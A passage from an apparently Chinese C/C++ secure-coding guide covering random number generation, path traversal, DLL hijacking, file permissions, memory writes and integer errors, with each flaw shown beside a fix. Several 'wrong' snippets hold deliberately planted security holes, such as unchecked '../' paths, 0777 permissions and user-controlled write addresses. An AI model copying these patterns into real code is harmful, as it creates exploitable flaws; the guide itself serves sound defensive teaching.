等无密码学安全性保证的普通随机数生成器。</p><p>推荐使用的 CSPRNG 有：</p><ol><li><p>OpenSSL 中的 <code>RAND_bytes()</code> 函数, <a href="https://www.openssl.org/docs/man1.1.1/man3/RAND_bytes.html">https://www.openssl.org/docs/man1.1.1/man3/RAND_bytes.html</a></p></li><li><p>libsodium 中的 <code>randombytes_buf()</code> 函数</p></li><li><p>Linux kernel 的 <code>getrandom()</code> 系统调用, <a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">https://man7.org/linux/man-pages/man2/getrandom.2.html</a> .<br> 或者读 &#x2F;dev&#x2F;urandom 文件, 或者 &#x2F;dev&#x2F;random 文件。</p></li><li><p>Apple IOS 的 <code>SecRandomCopyBytes()</code>, <a href="https://developer.apple.com/documentation/security/1399291-secrandomcopybytes">https://developer.apple.com/documentation/security/1399291-secrandomcopybytes</a></p></li><li><p>Windows 下的 <code>BCryptGenRandom()</code>, <code>CryptGenRandom()</code>, <code>RtlGenRandom()</code></p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/aes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/crypto.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/rand.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> != <span class="built_in">RAND_bytes</span>(&amp;key[<span class="number">0</span>], <span class="built_in">sizeof</span>(key))) &#123;  <span class="comment">//... 错误处理</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AES_KEY aes_key;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">AES_set_encrypt_key</span>(&amp;key[<span class="number">0</span>], <span class="built_in">sizeof</span>(key) * <span class="number">8</span>, &amp;aes_key)) &#123;</span><br><span class="line">            <span class="comment">// ... 错误处理</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="built_in">OPENSSL_cleanse</span>(&amp;key[<span class="number">0</span>], <span class="built_in">sizeof</span>(key));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>rand()</code>类函数的随机性并不高。敏感操作时，如设计加密算法时，不得使用rand()或者类似的简单线性同余伪随机数生成器来作为随机数发生器。符合该定义的比特序列的特点是，序列中“1”的数量约等于“0”的数量；同理，“01”、“00”、“10”、“11”的数量大致相同，以此类推。</p><p>例如 C 标准库中的 <code>rand()</code> 的实现只是简单的<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=stdlib/random_r.c;hb=glibc-2.28#l353">线性同余算法</a>，生成的伪随机数具有较强的可预测性。</p><p>当需要实现高强度加密，例如涉及通信安全时，不应当使用 <code>rand()</code> 作为随机数发生器。</p><p>实际应用中，<a href="https://docs.microsoft.com/en-us/cpp/standard-library/random-device-class?redirectedfrom=MSDN&view=vs-2019#remarks"> C++11 标准提供的<code>random_device</code>保证加密的安全性和随机性</a><br>但是 <a href="https://stackoverflow.com/questions/44867500/is-stdrandom-device-cryptographic-secure">C++ 标准并不保证这一点</a>。跨平台的代码可以考虑用 <a href="https://wiki.openssl.org/index.php/Random_Numbers">OpenSSL</a> 等保证密码学安全的库里的随机数发生器。</p><p>关联漏洞:</p><p><code>高风险-敏感数据泄露</code></p><p><a id="1.4.5"></a></p><h4 id="4-5-【必须】自己实现的rand范围不应过小"><a href="#4-5-【必须】自己实现的rand范围不应过小" class="headerlink" title="4.5  【必须】自己实现的rand范围不应过小"></a>4.5  【必须】自己实现的rand范围不应过小</h4><p>如果在弱安全场景相关的算法中自己实现了PRNG，请确保rand出来的随机数不会很小或可预测。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">int32_t</span> val = ((state[<span class="number">0</span>] * <span class="number">1103515245U</span>) + <span class="number">12345U</span>) &amp; <span class="number">999999</span>;</span><br></pre></td></tr></table></figure><p>上述例子可能想生成0~999999共100万种可能的随机数，但是999999的二进制是11110100001000111111，与&amp;运算后，0位一直是0，所以生成出的范围明显会小于100万种。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">int32_t</span> val = ((state[<span class="number">0</span>] * <span class="number">1103515245U</span>) + <span class="number">12345U</span>) % <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">int32_t</span> val = ((state[<span class="number">0</span>] * <span class="number">1103515245U</span>) + <span class="number">12345U</span>) &amp; <span class="number">0x7fffffff</span>;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-逻辑漏洞</code></p><p><a id="1.5"></a></p><h3 id="5-文件操作"><a href="#5-文件操作" class="headerlink" title="5    文件操作"></a>5    文件操作</h3><p><a id="1.5.1"></a></p><h4 id="5-1-【必须】避免路径穿越问题"><a href="#5-1-【必须】避免路径穿越问题" class="headerlink" title="5.1  【必须】避免路径穿越问题"></a>5.1  【必须】避免路径穿越问题</h4><p>在进行文件操作时，需要判断外部传入的文件名是否合法，如果文件名中包含 <code>../</code> 等特殊字符，则会造成路径穿越，导致任意文件的读写。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> file_path[PATH_MAX] = <span class="string">&quot;/home/user/code/&quot;</span>;</span><br><span class="line">  <span class="comment">// 如果传入的文件名包含../可导致路径穿越</span></span><br><span class="line">  <span class="comment">// 例如&quot;../file.txt&quot;，则可以读取到上层目录的file.txt文件</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">20</span>] = <span class="string">&quot;../file.txt&quot;</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(file_path + <span class="built_in">strlen</span>(file_path), name, <span class="built_in">sizeof</span>(name));</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">open</span>(file_path, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="built_in">sizeof</span>(data));</span><br><span class="line">    num = <span class="built_in">read</span>(fd, data, <span class="built_in">sizeof</span>(data));</span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">write</span>(STDOUT_FILENO, data, num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> file_path[PATH_MAX] = <span class="string">&quot;/home/user/code/&quot;</span>;</span><br><span class="line">  <span class="type">char</span> name[<span class="number">20</span>] = <span class="string">&quot;../file.txt&quot;</span>;</span><br><span class="line">  <span class="comment">// 判断传入的文件名是否非法，例如&quot;../file.txt&quot;中包含非法字符../，直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(name, <span class="string">&quot;..&quot;</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="comment">// 包含非法字符</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(file_path + <span class="built_in">strlen</span>(file_path), name, <span class="built_in">sizeof</span>(name));</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">open</span>(file_path, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="built_in">sizeof</span>(data));</span><br><span class="line">    num = <span class="built_in">read</span>(fd, data, <span class="built_in">sizeof</span>(data));</span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">write</span>(STDOUT_FILENO, data, num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-逻辑漏洞</code>  </p><p><a id="1.5.2"></a></p><h4 id="5-2-【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题）"><a href="#5-2-【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题）" class="headerlink" title="5.2  【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题）"></a>5.2  【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题）</h4><p>在程序中，使用相对路径可能导致一些安全风险，例如DLL、EXE劫持等问题。</p><p>例如以下代码，可能存在劫持问题：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 传入的是dll文件名，如果当前目录下被写入了恶意的同名dll，则可能导致dll劫持</span></span><br><span class="line">  HINSTANCE hinst = ::<span class="built_in">LoadLibrary</span>(<span class="string">&quot;dll_nolib.dll&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (hinst != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;dll loaded!&quot;</span> &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对DLL劫持的安全编码的规范：</p><p>   1）调用LoadLibrary，LoadLibraryEx，CreateProcess，ShellExecute等进行模块加载的函数时，指明模块的完整（全）路径，禁止使用相对路径，这样就可避免从其它目录加载DLL。<br>   2）在应用程序的开头调用SetDllDirectory(TEXT(“”)); 从而将当前目录从DLL的搜索列表中删除。结合SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题。这些API只能在打了KB2533623补丁的Windows7，2008上使用。</p><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.5.3"></a></p><h4 id="5-3-【必须】文件权限控制"><a href="#5-3-【必须】文件权限控制" class="headerlink" title="5.3  【必须】文件权限控制"></a>5.3  【必须】文件权限控制</h4><p>在创建文件时，需要根据文件的敏感级别设置不同的访问权限，以防止敏感数据被其他恶意程序读取或写入。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 不要设置为777权限，以防止被其他恶意程序操作</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">creat</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;文件创建失败！\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;文件创建成功！\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p> <code>中风险-逻辑漏洞</code>  </p><p><a id="1.6"></a></p><h3 id="6-内存操作"><a href="#6-内存操作" class="headerlink" title="6 内存操作"></a>6 内存操作</h3><p><a id="1.6.1"></a></p><h4 id="6-1-【必须】防止各种越界写（向前-x2F-向后）"><a href="#6-1-【必须】防止各种越界写（向前-x2F-向后）" class="headerlink" title="6.1 【必须】防止各种越界写（向前&#x2F;向后）"></a>6.1 【必须】防止各种越界写（向前&#x2F;向后）</h4><p>错误1：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>];</span><br><span class="line">a[<span class="number">5</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>错误2：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> b = user_controlled_value;</span><br><span class="line">a[b] = <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.6.2"></a></p><h4 id="6-2-【必须】防止任意地址写"><a href="#6-2-【必须】防止任意地址写" class="headerlink" title="6.2 【必须】防止任意地址写"></a>6.2 【必须】防止任意地址写</h4><p>任意地址写会导致严重的安全隐患，可能导致代码执行。因此，在编码时必须校验写入的地址。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Write</span><span class="params">(MyStruct dst_struct)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> payload[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="built_in">memcpy</span>(dst_struct.buf, payload, <span class="built_in">sizeof</span>(payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  MyStruct dst_stuct;</span><br><span class="line">  dst_stuct.buf = (<span class="type">char</span>*)user_controlled_value;</span><br><span class="line">  <span class="built_in">Write</span>(dst_stuct);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.7"></a></p><h3 id="7-数字操作"><a href="#7-数字操作" class="headerlink" title="7 数字操作"></a>7 数字操作</h3><p><a id="1.7.1"></a></p><h4 id="7-1-【必须】防止整数溢出"><a href="#7-1-【必须】防止整数溢出" class="headerlink" title="7.1 【必须】防止整数溢出"></a>7.1 【必须】防止整数溢出</h4><p>在计算时需要考虑整数溢出的可能，尤其在进行内存操作时，需要对分配、拷贝等大小进行合法校验，防止整数溢出导致的漏洞。</p><p>错误（该例子在计算时产生整数溢出）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> kMicLen = <span class="number">4</span>;</span><br><span class="line"><span class="comment">// 整数溢出</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> len = <span class="number">1</span>;</span><br><span class="line">  <span class="type">char</span> payload[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="type">char</span> dst[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="comment">// Bad, 由于len小于4，导致计算拷贝长度时，整数溢出</span></span><br><span class="line">  <span class="comment">// len - kMicLen == 0xfffffffd</span></span><br><span class="line">  <span class="built_in">memcpy</span>(dst, payload, len - kMicLen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> len = <span class="number">1</span>;</span><br><span class="line">  <span class="type">char</span> payload[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="type">char</span> dst[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="type">int</span> size = len - kMicLen;</span><br><span class="line">  <span class="comment">// 拷贝前对长度进行判断</span></span><br><span class="line">  <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; size &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(dst, payload, size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;memcpy good\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.7.2"></a></p><h4 id="7-2-【必须】防止Off-By-One"><a href="#7-2-【必须】防止Off-By-One" class="headerlink" title="7.2 【必须】防止Off-By-One"></a>7.2 【必须】防止Off-By-One</h4><p>在进行计算或者操作时，如果使用的最大值或最小值不正确，使得该值比正确值多1或少1，可能导致安全风险。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> firstname[<span class="number">20</span>];</span><br><span class="line"><span class="type">char</span> lastname[<span class="number">20</span>];</span><br><span class="line"><span class="type">char</span> fullname[<span class="number">40</span>];</span><br><span class="line"></span><br><span class="line">fullname[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncat</span>(fullname, firstname, <span class="number">20</span>);</span><br><span class="line"><span class="comment">// 第二次调用strncat()可能会追加另外20个字符。如果这20个字符没有终止空字符，则存在安全问题</span></span><br><span class="line"><span class="built_in">strncat</span>(fullname, lastname, <span class="number">20</span>);</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> firstname[<span class="number">20</span>];</span><br><span class="line"><span class="type">char</span> lastname[<span class="number">20</span>];</span><br><span class="line"><span class="type">char</span> fullname[<span class="number">40</span>];</span><br><span class="line"></span><br><span class="line">fullname[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当使用像strncat()函数时，必须在缓冲区的末尾为终止空字符留下一个空字节，避免off-by-one</span></span><br><span class="line"><span class="built_in">strncat</span>(fullname, firstname, <span class="built_in">sizeof</span>(fullname) - <span class="built_in">strlen</span>(fullname) - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">strncat</span>(fullname, lastname, <span class="built_in">sizeof</span>(fullname) - <span class="built_in">strlen</span>(fullname) - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>对于 C++ 代码，再次强烈建议使用 <code>string</code>、<code>vector</code> 等组件代替原始指针和数组操作。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.7.3"></a></p><h4 id="7-3-【必须】避免大小端错误"><a href="#7-3-【必须】避免大小端错误" class="headerlink" title="7.3 【必须】避免大小端错误"></a>7.3 【必须】避免大小端错误</h4><p>在一些涉及大小端数据处理的场景，需要进行大小端判断，例如从大端设备取出的值，要以大端进行处理，避免端序错误使用。</p><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.7.4"></a></p><h4 id="7-4-【必须】检查除以零异常"><a href="#7-4-【必须】检查除以零异常" class="headerlink" title="7.4 【必须】检查除以零异常"></a>7.4 【必须】检查除以零异常</h4><p>在进行除法运算时，需要判断被除数是否为零，以防导致程序不符合预期或者崩溃。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">divide</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x / y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">divide</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> DivideByZero;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x / y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>低风险-拒绝服务</code></p><p><a id="1.7.5"></a></p><h4 id="7-5-【必须】防止数字类型的错误强转"><a href="#7-5-【必须】防止数字类型的错误强转" class="headerlink" title="7.5 【必须】防止数字类型的错误强转"></a>7.5 【必须】防止数字类型的错误强转</h4><p>在有符号和无符号数字参与的运算中，需要注意类型强转可能导致的逻辑错误，建议指定参与计算时数字的类型或者统一类型参与计算。</p><p>错误例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> len = <span class="number">1</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">9</span>;</span><br><span class="line">  <span class="comment">// 1 &lt; 9 - 10 ? 由于运算中无符号和有符号混用，导致计算结果以无符号计算</span></span><br><span class="line">  <span class="keyword">if</span> (len &lt; size - <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bad\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 统一两者计算类型为有符号</span></span><br><span class="line">  <span class="type">int</span> len = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> size = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">if</span> (len &lt; size - <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bad\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.7.6"></a></p><h4 id="7-6-【必须】比较数据大小时加上最小-x2F-最大值的校验"><a href="#7-6-【必须】比较数据大小时加上最小-x2F-最大值的校验" class="headerlink" title="7.6 【必须】比较数据大小时加上最小&#x2F;最大值的校验"></a>7.6 【必须】比较数据大小时加上最小&#x2F;最大值的校验</h4><p>在进行数据大小比较时，要合理地校验数据的区间范围，建议根据数字类型，对其进行最大和最小值的判断，以防止非预期错误。</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="comment">// 此处index是int型，只考虑了index小于数组大小，但是并未判断是否大于等于0</span></span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">30</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果index为负数，则越界</span></span><br><span class="line">    a[index] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="comment">// 判断index的最大最小值</span></span><br><span class="line">  <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt; <span class="number">30</span>) &#123;</span><br><span class="line">    a[index] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.8"></a></p><h3 id="8-指针操作"><a href="#8-指针操作" class="headerlink" title="8    指针操作"></a>8    指针操作</h3><p><a id="1.8.1"></a></p><h4 id="8-1-【建议】检查在pointer上使用sizeof"><a href="#8-1-【建议】检查在pointer上使用sizeof" class="headerlink" 